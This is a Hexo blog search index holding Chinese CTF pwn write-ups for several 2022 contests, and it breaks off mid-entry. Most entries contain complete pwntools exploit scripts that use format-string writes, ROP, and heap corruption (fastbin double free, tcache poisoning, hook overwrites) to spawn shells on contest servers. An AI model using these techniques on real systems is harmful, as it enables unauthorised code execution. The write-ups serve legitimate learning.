<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2022天津市大学生信息安全网络攻防决赛 pwn</title>
    <link href="/2022/11/05/%E5%A4%A9%E6%B4%A5%E5%B8%82%E6%94%BB%E9%98%B2/"/>
    <url>/2022/11/05/%E5%A4%A9%E6%B4%A5%E5%B8%82%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<p>比赛时间只有3个小时，这里我只写出了echo、hero，还一道choice没时间去写了，后续自己在本地复现了一下。</p><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>格式化字符串漏洞</p><p><img src="/img/3/Screenshot_20221105_115756.png"></p><p>先利用格式字符串读出canary的值绕过检查</p><p>利用格式字符串修改0x601068地址的值，修改为字符串<code>/bin/sh\x00</code></p><p>再利用栈溢出和system函数执行ROP</p><p><img src="/img/3/Screenshot_20221105_121837.png"></p><p>开始我想一次性修改多个字节，但好像有canary以及缓冲区太小，所以每次只修改一个字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;echo&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./echo&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;172.31.1.105&#x27;</span>,<span class="hljs-number">50004</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>bss = <span class="hljs-number">0x601068</span><br><br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;%11$p&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br>bin_sh = <span class="hljs-number">0x0068732f6e69622f</span><br><br>pay = <span class="hljs-string">b&#x27;%47c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%98c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">1</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%105c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">2</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%110c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">3</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%47c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">4</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%115c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">5</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%104c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">6</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">7</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br><br>payload = <span class="hljs-string">b&#x27;quit&#x27;</span>.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) +  p64(<span class="hljs-number">0x4005e9</span>) + p64(<span class="hljs-number">0x400903</span>) + p64(bss) + p64(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="hero"><a href="#hero" class="headerlink" title="hero"></a>hero</h3><p>在edit函数中有个单字节溢出</p><p><img src="/img/3/Screenshot_20221105_120111.png"></p><p>可以伪造修改下一个堆块的prev_size大小和size尾字节为\x00，在申请释放会本来正常申请的堆块合并。</p><p>最后利用fastbin二次释放，指向malloc_hook，<code>__realloc_hook改为onegadget</code> ， <code>__malloc_hook改为__libc_reallo</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;hero&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc_64.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./hero&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;172.31.1.105&#x27;</span>,<span class="hljs-number">50005</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">name, power</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br>    p.sendafter(<span class="hljs-string">b&#x27;power:&#x27;</span>, power)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;show?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, name, power</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;edit?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br>    p.sendafter(<span class="hljs-string">b&#x27;power:&#x27;</span>, power)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;remove?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x170</span>)<br>edit(<span class="hljs-number">1</span>, payload, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">1</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>malloc_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>libc_reallo = libcbase + <span class="hljs-number">0x846c0</span><br>onegadget = libcbase + <span class="hljs-number">0xf1117</span><br><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>edit(<span class="hljs-number">1</span> ,<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(p64(malloc_hook - <span class="hljs-number">0x23</span>), <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">11</span> + p64(onegadget) + p64(libc_reallo + <span class="hljs-number">6</span>)<br>add(payload ,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="choice"><a href="#choice" class="headerlink" title="choice"></a>choice</h3><p>本地复现环境：2.23-0ubuntu11.3_i386</p><p>在此输入时利用最后一个字节即可覆盖nbytes的值，然后在下一次输入时让其栈溢出，最后ret2libc</p><p><img src="/img/3/Screenshot_20221105_104723.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;choice&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./choice&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>pay = <span class="hljs-string">b&#x27;a&#x27;</span>.ljust(<span class="hljs-number">20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + <span class="hljs-string">b&#x27;\x50&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, pay)<br>p.sendlineafter(<span class="hljs-string">b&#x27;now&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p32(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p32(<span class="hljs-number">0x80485bb</span>) + p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>p.sendafter(<span class="hljs-string">b&#x27;it?&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>leak = u32(p.recv(<span class="hljs-number">4</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libcbase + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br><br>p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, pay)<br>p.sendlineafter(<span class="hljs-string">b&#x27;now&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p32(sys_addr) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(bin_sh)<br>p.sendafter(<span class="hljs-string">b&#x27;it?&#x27;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>祥云杯2022 sandboxheap和bitheapk</title>
    <link href="/2022/11/02/%E7%A5%A5%E4%BA%91%E6%9D%AF-sandboxheap%E5%92%8Cbitheap/"/>
    <url>/2022/11/02/%E7%A5%A5%E4%BA%91%E6%9D%AF-sandboxheap%E5%92%8Cbitheap/</url>
    
    <content type="html"><![CDATA[<p>我是先写的sandboxheap，开始还以为sandbox文件是多余的，就直接单独拿sandboxheap去写，就在本地打通后，发现远程是有通过sandbox去执行sandboxheap，当时我就没能写出来。</p><p>山重水复疑无路，柳暗花明又一村！没想到bitheap漏洞和sandboxheap一模一样，而且没有sandbox，当时就只写出了bitheap。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这两道题都是一样的漏洞，主要是看懂编辑函数中的溢出和加密：</p><p>如下图将堆块写入数据的大小乘8 ，然后加1；最后是通过基于输入的8个字符去对堆中的一个字节进行位运算，每个字符可以操作堆中一个字节的一位；最后会多出一个字节影响下一个堆块的size</p><p><img src="/img/4/Screenshot_20221105_024929.png"></p><p>如下图sub_C61函数，基于堆块中的字符来位运算，但堆块初始值都是<code>0</code>，最后被写入堆块的也是0  ；如果输入的是<code>\x31</code>字符会让最后被写入堆块的的是1。</p><p><img src="/img/4/Screenshot_20221105_025735.png"></p><h3 id="bitheap"><a href="#bitheap" class="headerlink" title="bitheap"></a>bitheap</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;bitheap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br><span class="hljs-comment">#p = process([&#x27;./sandbox&#x27;,&#x27;./sandboxheap&#x27;])</span><br><span class="hljs-comment">#p = process(&#x27;./bitheap&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;39.106.13.71&#x27;</span>,<span class="hljs-number">42991</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key</span>(<span class="hljs-params">pay</span>):<br>    pay = u64(pay)<br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        a = pay &amp; <span class="hljs-number">0xff</span><br>        <span class="hljs-comment">#print(hex(a))</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            b = <span class="hljs-number">1</span> &lt;&lt; i<br>            <span class="hljs-keyword">if</span> b &amp; a == <span class="hljs-number">0</span>:<br>                result += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>            <span class="hljs-keyword">else</span> :<br>                result += <span class="hljs-string">b&#x27;\x31&#x27;</span><br>        pay = pay &gt;&gt; <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    add(i, <span class="hljs-number">0xb0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0xb8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    delete(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x80</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x18</span>)<br><br><br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x80</span> + key(p64(<span class="hljs-number">0xc0</span>)) + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">2</span>, payload)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br><br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>payload = key(p64(free_hook))<br>edit(<span class="hljs-number">2</span>, payload)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">1</span>, key(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">3</span>, key(p64(sys_addr)))<br>delete(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="sandboxheap"><a href="#sandboxheap" class="headerlink" title="sandboxheap"></a>sandboxheap</h3><p>未完待续……</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 公开赛Week4 pwn 这是堆🐎</title>
    <link href="/2022/11/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9BWeek4-pwn-%E8%BF%99%E6%98%AF%E5%A0%86/"/>
    <url>/2022/11/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9BWeek4-pwn-%E8%BF%99%E6%98%AF%E5%A0%86/</url>
    
    <content type="html"><![CDATA[<p>题目环境：glibc-2.31</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先看到题目调用了prctl函数，说明开了沙盒保护机制。使用seccomp-tools检查一下</p><img src="/img/2/1667357666548.png" style="zoom: 80%;" /><p>发现题目禁止了execve的系统调用，我们很容易想到要用orw将flag读取出来；但这题还把open函数给禁用了（是不是很无语），这里我们可以系统调用openat函数去打开文件，openat函数的系统调用号为257。 </p><p>​                                                                                                     </p><p>Add函数申请堆块，Dele函数和Show函数就一句简单的puts输出。</p><p>再去看看Edit函数，对v1采用int类型去定义的，没有对负数进行检查，我们就可以利用这一点去修改除堆以外的其它地方。</p><p><img src="/img/2/1667357538953.png"></p><p>进一步查看运行时全局变量heaps在bss段的数据，发现存在IO_FILE的地址，可以输入负数然后直接修改_IO_FILE当中的值。</p><img src="/img/2/1667359698418.png" style="zoom: 80%;" /><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>由于没有一个固定的地址和可执行段去让我们使用，使用shellcode去执行orw将flag读取出来，对于这题来说是很困难的，所以我们使用ROP劫持rsp寄存器来实现orw。</p><p>程序中的gadget肯定是不够我们去实现ROP的，我们就使用libc中的gadget。</p><p>要控制rsp才可以去ROP，libc中可以去执行setcontext中的代码控制rsp（具体见我的Dest0g3 520迎新赛 pwn ez_kiwi这篇文章）。</p><p>我们可以去修改_IO_FILE当中的值，就想办法劫持其中的控制流，来执行setcontext。</p><h3 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h3><h5 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h5><p>这里我们就去修改标准输出<code>_IO_2_1_stdout_</code>中的值首先泄漏libc的基址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br></code></pre></td></tr></table></figure><p>然后使用ROPgadget 找到相应的gadget，<code>syscall ret</code>这个geaget可以使用操作码去寻找（如下）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROPgadget <span class="hljs-attr">--binary</span> libc-<span class="hljs-number">2.31</span><span class="hljs-selector-class">.so</span> <span class="hljs-attr">--opcode</span> <span class="hljs-string">&quot;0f05c3&quot;</span><br></code></pre></td></tr></table></figure><p>我们还要寻找<code>0x0000000000151990 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 